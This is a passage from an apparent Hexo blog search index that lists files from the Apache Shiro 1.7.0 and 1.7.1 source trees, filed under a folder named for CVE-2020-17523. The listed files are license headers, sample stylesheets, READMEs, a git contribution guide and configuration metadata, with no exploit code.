\"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/guice/README","date":"2021-03-03T08:20:22.258Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/guice/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/samples/guice/README/","excerpt":"","text":"Apache Shiro + Guice Example A Guice example web application that show how to configure Shiro via Guice, and basic user login. Run the Example 1mvn jetty:run Browse to http://localhost:9080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/integration-tests/guice4/src/main/webapp/style","date":"2021-03-03T08:20:22.191Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/integration-tests/guice4/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/integration-tests/guice4/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/integration-tests/guice3/src/main/webapp/style","date":"2021-03-03T08:20:22.172Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/integration-tests/guice3/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/integration-tests/guice3/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/CONTRIBUTING","date":"2021-03-03T08:20:21.516Z","updated":"2021-01-27T20:33:19.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/CONTRIBUTING/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.1/shiro-shiro-root-1.7.1/CONTRIBUTING/","excerpt":"","text":"Contributing to Apache Shiro Summary This document covers how to contribute to the Apache Shiro project. These instructions assume you have a GitHub.com account, so if you don’t have one you will have to create one. Your proposed code changes will be published to your own fork of the Apache Shiro project and you will submit a Pull Request for your changes to be added. Lets get started!!! Fork the code In your browser, navigate to: https://github.com/apache/shiro Fork the repository by clicking on the ‘Fork’ button on the top right hand side. The fork will happen and you will be taken to your own fork of the repository. Copy the Git repository URL by clicking on the clipboard next to the URL on the right hand side of the page under ‘HTTPS clone URL’. You will paste this URL when doing the following git clone command. On your computer, follow these steps to setup a local repository for working on Apache Shiro: 123456$ git clone https://github.com/YOUR_ACCOUNT/shiro.git$ cd shiro$ git remote add upstream https://github.com/apache/shiro.git$ git checkout master$ git fetch upstream$ git rebase upstream/master Making changes It is important that you create a new branch to make changes on and that you do not change the master branch (other than to rebase in changes from upstream/master). In this example I will assume you will be making your changes to a branch called feature_x. This feature_x branch will be created on your local repository and will be pushed to your forked repository on GitHub. Once this branch is on your fork you will create a Pull Request for the changes to be added to the Apache Shiro project. It is best practice to create a new branch each time you want to contribute to the project and only track the changes for that pull request in this branch. 12345$ git checkout -b feature_x (make your changes)$ git status$ git add .$ git commit -a -m \"descriptive commit message for your changes\" The -b specifies that you want to create a new branch called feature_x. You only specify -b the first time you checkout because you are creating a new branch. Once the feature_x branch exists, you can later switch to it with only git checkout feature_x. Rebase feature_x to include updates from upstream/master It is important that you maintain an up-to-date master branch in your local repository. This is done by rebasing in the code changes from upstream/master (the official Apache Shiro project repository) into your local repository. You will want to do this before you start working on a feature as well as right before you submit your changes as a pull request. I recommend you do this process periodically while you work to make sure you are working off the most recent project code. This process will do the following: Checkout your local master branch Synchronize your local master branch with the upstream/master so you have all the latest changes from the project Rebase the latest project code into your feature_x branch so it is up-to-date with the upstream code 12345$ git checkout master$ git fetch upstream$ git rebase upstream/master$ git checkout feature_x$ git rebase master Now your feature_x branch is up-to-date with all the code in upstream/master. Make a GitHub Pull Request to contribute your changes When you are happy with your changes and you are ready to contribute them, you will create a Pull Request on GitHub to do so. This is done by pushing your local changes to your forked repository (default remote name is origin) and then initiating a pull request on GitHub. IMPORTANT: Make sure you have rebased your feature_x branch to include the latest code from upstream/master before you do this. 12$ git push origin master$ git push origin feature_x Now that the feature_x branch has been pushed to your GitHub repository, you can initiate the pull request. To initiate the pull request, do the following: In your browser, navigate to your forked repository: https://github.com/YOUR_ACCOUNT/shiro Click the new button called ‘Compare &amp; pull request’ that showed up just above the main area in your forked repository Validate the pull request will be into the upstream master and will be from your feature_x branch Enter a detailed description of the work you have done and then click ‘Send pull request’ If you are requested to make modifications to your proposed changes, make the changes locally on your feature_x branch, re-push the feature_x branch to your fork. The existing pull request should automatically pick up the change and update accordingly. Cleaning up after a successful pull request Once the feature_x branch has been committed into the upstream/master branch, your local feature_x branch and the origin/feature_x branch are no longer needed. If you want to make additional changes, restart the process with a new branch. IMPORTANT: Make sure that your changes are in upstream/master before you delete your feature_x and origin/feature_x branches! You can delete these deprecated branches with the following: 123$ git checkout master$ git branch -D feature_x$ git push origin :feature_x document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/support/spring-boot/spring-boot-web-starter/src/main/resources/META-INF/additional-spring-configuration-metadata","date":"2021-03-03T08:20:18.726Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/support/spring-boot/spring-boot-web-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/support/spring-boot/spring-boot-web-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","excerpt":"","text":"{\"groups\":[{\"name\":\"shiro\"}],\"properties\":[{\"name\":\"shiro.web.enabled\",\"type\":\"java.lang.Boolean\",\"description\":\"A boolean flag that can disable all Shiro Spring Boot starters. This is mostly useful during testing or debugging, or if you want to compare behavior when Shiro is enabled or disabled.\",\"defaultValue\":true},{\"name\":\"shiro.loginUrl\",\"type\":\"java.lang.String\",\"description\":\"The application's login URL to be assigned to all acquired Filters that subclass AccessControlFilter or 'null' if no value should be assigned globally.\",\"defaultValue\":\"/login.jsp\"},{\"name\":\"shiro.successUrl\",\"type\":\"java.lang.String\",\"description\":\"The application's after-login success URL to be assigned to all acquired Filters that subclass AuthenticationFilter or null if no value should be assigned globally.\",\"defaultValue\":\"/\"},{\"name\":\"shiro.unauthorizedUrl\",\"type\":\"java.lang.String\",\"description\":\"The application's 'unauthorized' URL to apply to as a convenience to all discovered AuthorizationFilter instances.\",\"defaultValue\":null},{\"name\":\"shiro.sessionManager.sessionIdCookieEnabled\",\"type\":\"java.lang.String\",\"description\":\"Enable or disable session tracking via a cookie.\",\"defaultValue\":true},{\"name\":\"shiro.sessionManager.sessionIdUrlRewritingEnabled\",\"type\":\"java.lang.String\",\"description\":\"Enable or disable session tracking via a URL parameter. If your site requires cookies, it is recommended you disable this.\",\"defaultValue\":true}]} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/support/spring-boot/spring-boot-starter/src/main/resources/META-INF/additional-spring-configuration-metadata","date":"2021-03-03T08:20:18.706Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/support/spring-boot/spring-boot-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/support/spring-boot/spring-boot-starter/src/main/resources/META-INF/additional-spring-configuration-metadata/","excerpt":"","text":"{\"groups\":[{\"name\":\"shiro\"}],\"properties\":[{\"name\":\"shiro.enabled\",\"type\":\"java.lang.Boolean\",\"description\":\"A boolean flag that can disable all Shiro Spring Boot starters. This is mostly useful during testing or debugging, or if you want to compare behavior when Shiro is enabled or disabled.\",\"defaultValue\":true}]} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/web/src/main/webapp/style","date":"2021-03-03T08:20:18.541Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/web/src/main/webapp/style/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/web/src/main/webapp/style/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 15px 0 0 15px; padding: 1px; /*background: #2370cf;*/ font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick black solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/web/README","date":"2021-03-03T08:20:18.530Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/web/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/web/README/","excerpt":"","text":"Apache Shiro Web Example An example web application that show how to configure Shiro via a web.xml and basic user login. Run the Example 1mvn jetty:run Browse to http://localhost:9080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring/README","date":"2021-03-03T08:20:18.520Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring/README/","excerpt":"","text":"Apache Shiro + Spring Web Example This example creates a web application (WAR packaged) to demonstrate configuring Apache Shiro via Spring. This example also includes a Spring Remoting example. Run the Example 1mvn jetty:run Browse to http://localhost:8080/shiro-samples-spring document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-mvc/src/main/webapp/shiro","date":"2021-03-03T08:20:18.518Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-mvc/src/main/webapp/shiro/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-mvc/src/main/webapp/shiro/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { margin: 1px; padding: 1px; background: #fff; font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } table, td { font: 12px 'Lucida Grande', Geneva, Verdana, Arial, sans-serif; color: #000; } h1 { font: 24px; } img { border: thin black solid; } #contentBox { text-align: center; width: 50%; margin: auto; margin-top: 50px; color: black; background: #eee; border: thick #ccc solid; } document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-mvc/README","date":"2021-03-03T08:20:18.493Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-mvc/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-mvc/README/","excerpt":"","text":"Apache Shiro + Spring Web Example This example creates a web application (WAR packaged) to demonstrate configuring Apache Shiro via Spring. This example also includes a Spring Remoting example. Run the Example 1mvn jetty:run-war Browse to http://localhost:8080/shiro-samples-spring document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-hibernate/src/main/webapp/styles/sample","date":"2021-03-03T08:20:18.488Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-hibernate/src/main/webapp/styles/sample/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-hibernate/src/main/webapp/styles/sample/","excerpt":"","text":"/* * Licensed to the Apache Software Foundation (ASF) under one * or more contributor license agreements. See the NOTICE file * distributed with this work for additional information * regarding copyright ownership. The ASF licenses this file * to you under the Apache License, Version 2.0 (the * \"License\"); you may not use this file except in compliance * with the License. You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, * software distributed under the License is distributed on an * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY * KIND, either express or implied. See the License for the * specific language governing permissions and limitations * under the License. */ body { background: #f6f6f6} body, td, th { font-family:\"Lucida Grande\",\"Lucida Sans Unicode\",Arial,Verdana,sans-serif; color: #333; font-size: 12px; } #box { width: 500px; } #bigbox { width: 940px; } #bigbox, #box { margin: 30px; padding: 0; border: thin black solid; background: #fff} #bigbox .title, #box .title { display: block; margin: 0 0 5px 0; padding: 5px 5px 5px 15px; background: #ddd; font-size: 18px} #bigbox .title .info { float: right; padding-right: 10px; font-size: 12px} .errors { color: red; padding: 10px 0 10px 0; } .form-label { float: left; width: 100px;} .content { padding: 10px;} .content div { padding: 5px 0 5px 0 } #manageUsers { width: 800px } #manageUsers th { text-align: left } a:active, a:visited, a:link { color: #6666DD; text-decoration: none; } a:hover { color: #6666FF; text-decoration: underline; } .clearfix:after {content:\".\";display:block;height:0;clear:both;visibility:hidden;} .clearfix {display:inline-block;} * html .clearfix {height:1%;} .clearfix {display:block;} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-hibernate/README","date":"2021-03-03T08:20:18.453Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-hibernate/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-hibernate/README/","excerpt":"","text":"Apache Shiro + Spring Web + Hibernate Example A Spring Boot example web application that show the usage of a user login with Spring and Hibernate. Run the Example 1mvn jetty:run Browse to http://localhost:9080/ Or deploy to Heroku: document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot/README","date":"2021-03-03T08:20:18.445Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot/README/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot/README/","excerpt":"","text":"Apache Shiro + Spring CLI Example A Spring Boot example CLI application that show the usage of a user login, checking permissions, and annotation protected methods. Run the Example 1mvn spring-boot:run document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/login","date":"2021-03-03T08:20:18.444Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/login/","link":"","permalink":"http://yoursite.com/2021/03/03/Apache%20Shiro%20%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/login/","excerpt":"","text":"Here are a few sample accounts to play with from the text-based Realm Username Password Roles joe.coder password user jill.coder password admin Login document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"","slug":"Apache Shiro 权限绕过漏洞(CVE-2020-17523)/shiro/shiro-shiro-root-1.7.0/shiro-shiro-root-1.7.0/samples/spring-boot-web/src/main/resources/templates/hello","date":"2021-03-03T08:20:18.443Z","updated":"2020-10-23T10:01:38.000Z","comments":true,"path":"2021/03/03/Apache Shiro 